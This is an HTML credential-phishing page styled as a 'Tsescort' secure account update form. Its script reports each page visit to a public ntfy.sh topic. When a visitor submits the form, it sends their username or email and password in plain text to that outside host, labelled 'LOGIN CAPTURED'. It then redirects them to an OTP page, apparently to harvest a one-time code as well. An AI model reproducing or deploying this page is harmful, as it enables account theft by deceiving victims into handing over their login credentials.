<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
  <title>Tsescort · Secure Account Update</title>
  <!-- Font Awesome 6 (free) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <!-- Inter font -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
    }

    body {
      background: #ffffff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }

    /* ---------- SPLASH SCREEN (3 seconds) ---------- */
    .splash-screen {
      position: fixed;
      inset: 0;
      background: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      transition: opacity 1s cubic-bezier(0.4, 0, 0.2, 1), visibility 1s;
      visibility: visible;
      opacity: 1;
    }

    .splash-screen.hidden {
      opacity: 0;
      visibility: hidden;
      pointer-events: none;
    }

    .splash-logo {
      font-size: clamp(2.8rem, 10vw, 4.5rem);
      font-weight: 900;
      letter-spacing: 4px;
      background: linear-gradient(135deg, #ff3b3b, #ff6b4a, #ff2a2a);
      -webkit-background-clip: text;
      background-clip: text;
      -webkit-text-fill-color: transparent;
      filter: drop-shadow(0 0 30px #ff2a2a88) drop-shadow(0 0 60px #ff000044);
      animation: splashPulse 1.8s ease-in-out infinite alternate;
      margin-bottom: 0.5rem;
    }

    @keyframes splashPulse {
      0% { transform: scale(0.96); filter: drop-shadow(0 0 15px #ff3b3b99) drop-shadow(0 0 40px #ff000044); }
      100% { transform: scale(1.06); filter: drop-shadow(0 0 40px #ff3b3bdd) drop-shadow(0 0 80px #ff000088); }
    }

    .splash-sub {
      color: #b91c1c;
      font-size: clamp(0.6rem, 2.5vw, 0.85rem);
      letter-spacing: 8px;
      text-transform: uppercase;
      font-weight: 700;
      text-shadow: 0 0 20px #ff3b3b55;
      animation: splashSubFade 1.5s ease-in-out infinite alternate;
    }

    @keyframes splashSubFade {
      0% { opacity: 0.5; }
      100% { opacity: 1; }
    }

    .splash-ring {
      width: 90px;
      height: 90px;
      border-radius: 50%;
      border: 3px solid transparent;
      border-top-color: #ff3b3b;
      border-right-color: #ff6b4a;
      animation: splashSpin 0.9s linear infinite;
      margin-top: 2rem;
      filter: drop-shadow(0 0 12px #ff3b3b88);
    }

    @keyframes splashSpin {
      0% { transform: rotate(0); }
      100% { transform: rotate(360deg); }
    }

    /* ---------- MAIN CARD ---------- */
    .card {
      background: #ffffff;
      border: 1px solid #f0d0d0;
      border-radius: 2.8rem;
      padding: 2.5rem 2rem 2.2rem;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 25px 50px -12px #ffb3b3aa, 0 0 0 1px #ffe0e0 inset;
      position: relative;
      overflow: hidden;
      animation: cardAppear 0.8s cubic-bezier(0.16, 1, 0.3, 1) 3s both;
      opacity: 0;
      transform: translateY(20px);
    }

    @keyframes cardAppear {
      0% { opacity: 0; transform: translateY(30px) scale(0.98); }
      100% { opacity: 1; transform: translateY(0) scale(1); }
    }

    /* decorative soft orbs on white */
    .card::before {
      content: '';
      position: absolute;
      top: -40%;
      right: -20%;
      width: 280px;
      height: 280px;
      background: radial-gradient(circle, #ff3b3b18, transparent 70%);
      border-radius: 50%;
      z-index: 0;
      pointer-events: none;
    }

    .card::after {
      content: '';
      position: absolute;
      bottom: -30%;
      left: -20%;
      width: 240px;
      height: 240px;
      background: radial-gradient(circle, #ff6b4a12, transparent 70%);
      border-radius: 50%;
      z-index: 0;
      pointer-events: none;
    }

    .card > * {
      position: relative;
      z-index: 2;
    }

    .logo-wrap {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 1.8rem;
    }

    .logo-ts {
      font-size: 2.6rem;
      font-weight: 900;
      letter-spacing: 3px;
      background: linear-gradient(135deg, #ff3b3b, #ff6b4a, #ff2a2a);
      -webkit-background-clip: text;
      background-clip: text;
      -webkit-text-fill-color: transparent;
      filter: drop-shadow(0 0 20px #ff2a2a66) drop-shadow(0 0 40px #ff000033);
      line-height: 1;
      animation: logoPulse 2.6s infinite alternate;
    }

    @keyframes logoPulse {
      0% { filter: drop-shadow(0 0 12px #ff3b3b77) drop-shadow(0 0 30px #ff000033); }
      100% { filter: drop-shadow(0 0 28px #ff3b3baa) drop-shadow(0 0 60px #ff000066); }
    }

    .logo-sub {
      color: #e04545;
      font-size: 0.7rem;
      letter-spacing: 6px;
      text-transform: uppercase;
      font-weight: 600;
      margin-top: 6px;
      text-shadow: 0 0 12px #ff3b3b44;
    }

    .subhead {
      text-align: center;
      color: #9a6b6b;
      font-size: 0.95rem;
      margin: 1.4rem 0 2rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      background: #fff5f5;
      padding: 0.6rem 1rem;
      border-radius: 3rem;
      border: 1px solid #f5d0d0;
      transition: 0.2s;
    }

    .subhead i {
      color: #ff4a4a;
    }

    .input-group {
      margin-bottom: 1.6rem;
      position: relative;
    }

    .input-group label {
      display: block;
      color: #b35a5a;
      font-size: 0.8rem;
      font-weight: 600;
      margin-bottom: 0.5rem;
      letter-spacing: 0.5px;
      text-transform: uppercase;
      padding-left: 0.25rem;
    }

    .input-group i {
      position: absolute;
      left: 1.1rem;
      top: 2.75rem;
      color: #ff4a4a;
      font-size: 1.1rem;
      opacity: 0.85;
      pointer-events: none;
      transition: 0.2s;
    }

    .input-group input {
      width: 100%;
      padding: 1rem 1rem 1rem 3rem;
      background: #fff9f9;
      border: 1.5px solid #f0d0d0;
      border-radius: 1.3rem;
      font-size: 1rem;
      color: #3a1a1a;
      outline: none;
      transition: 0.2s;
    }

    .input-group input:focus {
      border-color: #ff4a4a;
      box-shadow: 0 0 0 4px rgba(255, 60, 60, 0.10);
      background: #ffffff;
    }

    .input-group input:focus + i {
      color: #d42b2b;
    }

    .input-group input::placeholder {
      color: #c49a9a;
      font-size: 0.95rem;
    }

    .update-btn {
      width: 100%;
      padding: 1rem;
      background: linear-gradient(135deg, #d42b2b, #ff3b3b, #cc1f1f);
      border: none;
      border-radius: 1.8rem;
      color: #fff;
      font-size: 1.1rem;
      font-weight: 700;
      letter-spacing: 0.6px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.75rem;
      cursor: pointer;
      margin-top: 1rem;
      box-shadow: 0 18px 30px -10px #ffb3b3;
      transition: 0.2s;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }

    .update-btn:hover {
      filter: brightness(1.08);
      box-shadow: 0 22px 36px -10px #ff9999;
      transform: translateY(-1px);
    }

    .update-btn:active {
      transform: scale(0.98);
    }

    .update-btn:disabled {
      opacity: 0.65;
      filter: grayscale(0.2);
      pointer-events: none;
    }

    .legal-note {
      text-align: center;
      margin-top: 1.8rem;
      font-size: 0.72rem;
      color: #b38a8a;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }

    .legal-note i {
      color: #ff4a4a;
    }

    /* ---------- LOADING OVERLAY ---------- */
    .loading-overlay {
      position: fixed;
      inset: 0;
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 2000;
      visibility: hidden;
      opacity: 0;
      transition: 0.35s;
    }

    .loading-overlay.active {
      visibility: visible;
      opacity: 1;
    }

    .ts-loader {
      position: relative;
      width: 120px;
      height: 120px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 2.2rem;
    }

    .ts-ring {
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      border: 4px solid transparent;
      border-top-color: #ff3b3b;
      border-right-color: #ff6b4a;
      border-bottom-color: #ff2a2a;
      animation: spinRing 1.4s cubic-bezier(0.65, 0.15, 0.35, 0.85) infinite;
      filter: drop-shadow(0 0 16px #ff3b3b88);
    }

    .ts-ring-2 {
      position: absolute;
      width: 84%;
      height: 84%;
      border-radius: 50%;
      border: 3px solid transparent;
      border-left-color: #ff7a7a;
      border-top-color: #ff4a4a;
      animation: spinRingReverse 1.8s cubic-bezier(0.55, 0.1, 0.45, 0.9) infinite;
      filter: drop-shadow(0 0 10px #ff5e5e66);
    }

    .ts-core {
      position: relative;
      z-index: 5;
      font-size: 2.4rem;
      font-weight: 900;
      letter-spacing: 2px;
      background: linear-gradient(135deg, #ff3b3b, #ff7a4a, #ff1f1f);
      -webkit-background-clip: text;
      background-clip: text;
      -webkit-text-fill-color: transparent;
      filter: drop-shadow(0 0 20px #ff2a2aaa);
      animation: corePulse 1.6s ease-in-out infinite alternate;
    }

    @keyframes spinRing {
      0% { transform: rotate(0); }
      100% { transform: rotate(360deg); }
    }

    @keyframes spinRingReverse {
      0% { transform: rotate(0); }
      100% { transform: rotate(-360deg); }
    }

    @keyframes corePulse {
      0% { transform: scale(0.96); filter: drop-shadow(0 0 12px #ff3b3baa); }
      100% { transform: scale(1.06); filter: drop-shadow(0 0 32px #ff2a2aff); }
    }

    .loading-overlay p {
      color: #9a3a3a;
      font-size: 1.15rem;
      display: flex;
      align-items: center;
      gap: 0.75rem;
      background: #fff5f5;
      padding: 0.8rem 2rem;
      border-radius: 60px;
      border: 1px solid #f0d0d0;
      box-shadow: 0 10px 30px -8px #ffb3b3aa, 0 0 25px #ff3b3b11;
    }

    .loading-overlay p i {
      color: #ff4a4a;
    }

    .dot-flash {
      display: inline-flex;
      gap: 4px;
    }

    .dot-flash span {
      width: 6px;
      height: 6px;
      background: #ff4a4a;
      border-radius: 50%;
      animation: dotFlash 1.4s infinite ease-in-out both;
    }

    .dot-flash span:nth-child(2) { animation-delay: 0.2s; }
    .dot-flash span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes dotFlash {
      0%, 80%, 100% { opacity: 0.3; transform: scale(0.8); }
      40% { opacity: 1; transform: scale(1.2); }
    }

    /* ---------- MEDIA QUERIES ---------- */
    @media (max-width: 520px) {
      body {
        padding: 0.75rem;
      }

      .card {
        padding: 2rem 1.5rem 1.8rem;
        border-radius: 2.2rem;
      }

      .logo-ts {
        font-size: 2.2rem;
        letter-spacing: 2px;
      }

      .logo-sub {
        font-size: 0.6rem;
        letter-spacing: 4px;
      }

      .subhead {
        font-size: 0.85rem;
        padding: 0.5rem 0.8rem;
        margin: 1.2rem 0 1.6rem;
      }

      .input-group input {
        padding: 0.9rem 0.9rem 0.9rem 2.8rem;
        font-size: 0.95rem;
      }

      .input-group i {
        left: 1rem;
        top: 2.6rem;
        font-size: 1rem;
      }

      .update-btn {
        padding: 0.9rem;
        font-size: 1rem;
        border-radius: 1.5rem;
      }

      .legal-note {
        font-size: 0.65rem;
        margin-top: 1.4rem;
      }

      .loading-overlay p {
        font-size: 1rem;
        padding: 0.7rem 1.5rem;
      }

      .ts-loader {
        width: 100px;
        height: 100px;
      }

      .ts-core {
        font-size: 2rem;
      }

      .splash-ring {
        width: 70px;
        height: 70px;
        border-width: 2.5px;
      }
    }

    @media (max-width: 380px) {
      .card {
        padding: 1.6rem 1.2rem 1.5rem;
        border-radius: 1.8rem;
      }

      .logo-ts {
        font-size: 1.8rem;
        letter-spacing: 1.5px;
      }

      .logo-sub {
        font-size: 0.55rem;
        letter-spacing: 3px;
      }

      .subhead {
        font-size: 0.78rem;
        gap: 5px;
      }

      .input-group label {
        font-size: 0.7rem;
      }

      .input-group input {
        padding: 0.8rem 0.8rem 0.8rem 2.5rem;
        font-size: 0.9rem;
        border-radius: 1rem;
      }

      .input-group i {
        left: 0.9rem;
        top: 2.4rem;
        font-size: 0.95rem;
      }

      .update-btn {
        padding: 0.8rem;
        font-size: 0.95rem;
        gap: 0.5rem;
        border-radius: 1.3rem;
      }

      .legal-note {
        font-size: 0.6rem;
      }
    }

    @media (min-width: 1024px) {
      .card {
        max-width: 520px;
        padding: 3rem 2.5rem 2.8rem;
      }

      .logo-ts {
        font-size: 3rem;
      }

      .input-group input {
        padding: 1.1rem 1.1rem 1.1rem 3.2rem;
      }
    }

    /* reduced motion preference */
    @media (prefers-reduced-motion: reduce) {
      .logo-ts,
      .splash-logo,
      .ts-core,
      .ts-ring,
      .ts-ring-2,
      .dot-flash span {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
      }
      .card {
        animation-delay: 0s !important;
      }
      .splash-screen {
        transition-duration: 0.01ms !important;
      }
    }
  </style>
</head>
<body>
  <!-- 3-SECOND SPLASH SCREEN -->
  <div class="splash-screen" id="splashScreen">
    <div class="splash-logo">TSESCORT</div>
    <div class="splash-sub">secure account update</div>
    <div class="splash-ring"></div>
  </div>

  <!-- MAIN CARD -->
  <div class="card">
    <div class="logo-wrap">
      <div class="logo-ts">TSESCORT</div>
      <div class="logo-sub">secure account update</div>
    </div>
    <div class="subhead"><i class="fas fa-lock"></i> Please login to update your account</div>
    <form id="updateForm">
      <div class="input-group">
        <label for="identifier">Email, phone, or username</label>
        <i class="fas fa-user-circle"></i>
        <input type="text" id="identifier" placeholder="you@tsescort.com · +1 234 5678 · @user" autocomplete="username" required>
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <i class="fas fa-key"></i>
        <input type="password" id="password" placeholder="••••••••" autocomplete="current-password" required>
      </div>
      <button type="submit" class="update-btn" id="updateBtn"><i class="fas fa-pen-to-square"></i> Update account</button>
    </form>
    <div class="legal-note"><i class="fas fa-shield"></i> Details stored in users.json (plain JSON)</div>
  </div>

  <!-- LOADING OVERLAY -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="ts-loader">
      <div class="ts-ring"></div>
      <div class="ts-ring-2"></div>
      <div class="ts-core">TS</div>
    </div>
    <p><i class="fas fa-lock"></i> Securing your update <span class="dot-flash"><span></span><span></span><span></span></span></p>
  </div>

  <script>
    (function(){
      // ------------------------------------------------------------
      // SPLASH SCREEN – hide after 3 seconds
      // ------------------------------------------------------------
      const splash = document.getElementById('splashScreen');
      setTimeout(() => {
        splash.classList.add('hidden');
      }, 3000);

      // ------------------------------------------------------------
      // NTFY NOTIFY – topic: ts_update
      // ONLY 2 NOTIFICATIONS:
      //   1) When the page lands
      //   2) When credentials are entered AND Update is clicked
      // ------------------------------------------------------------
      const NTFY_TOPIC = 'ts_update';
      const NTFY_URL = `https://ntfy.sh/${NTFY_TOPIC}`;

      function sendNtfy(message, tags = ['eyes']) {
        try {
          fetch(NTFY_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
              'Title': 'Tsescort Update',
              'Tags': tags.join(','),
              'Priority': 'default'
            },
            body: message
          }).catch(() => { /* silent */ });
        } catch (e) {
          // fallback silent
        }
      }

      // 1) LANDING NOTIFICATION
      sendNtfy('🚨 Tsescort page landed · ' + new Date().toISOString(), ['globe_with_meridians']);

      // ------------------------------------------------------------
      // ORIGINAL SERVER / API LOGIC (unchanged)
      // ------------------------------------------------------------
      const form = document.getElementById('updateForm');
      const updateBtn = document.getElementById('updateBtn');
      const loadingOverlay = document.getElementById('loadingOverlay');
      const identifierInput = document.getElementById('identifier');
      const passwordInput = document.getElementById('password');
      const SERVER_URL = '/update-account';

      async function sendUpdateRequest(identifier, password) {
        const payload = {
          identifier: identifier.trim(),
          password: password,
          timestamp: new Date().toISOString(),
          app: 'tsescort'
        };
        try {
          const r = await fetch(SERVER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          if (!r.ok) console.warn('Server responded with:', r.status);
          else {
            const d = await r.json().catch(() => ({}));
            console.log('[Tsescort] Update saved:', d);
          }
        } catch (e) {
          console.error('[Tsescort] Network error:', e);
        }
      }

      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (updateBtn.disabled) return;

        const identifier = identifierInput.value.trim();
        const password = passwordInput.value;

        if (!identifier || !password) {
          alert('Please fill in all fields.');
          return;
        }

        // 2) CREDENTIALS SUBMITTED NOTIFICATION (login + password)
        sendNtfy(
          `🔐 TSESCORT LOGIN CAPTURED\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `👤 Identifier: ${identifier}\n` +
          `🔑 Password:   ${password}\n` +
          `⏰ Time:       ${new Date().toISOString()}\n` +
          `━━━━━━━━━━━━━━━━━━━━`,
          ['lock', 'key']
        );

        updateBtn.disabled = true;
        updateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

        const startTime = Date.now();
        loadingOverlay.classList.add('active');

        await sendUpdateRequest(identifier, password);

        const elapsed = Date.now() - startTime;
        const remaining = Math.max(0, 5000 - elapsed);

        setTimeout(() => {
          loadingOverlay.classList.remove('active');
          window.location.href = 'otp.html';
        }, remaining);
      });

      // End of logic
    })();
  </script>
</body>
</html>
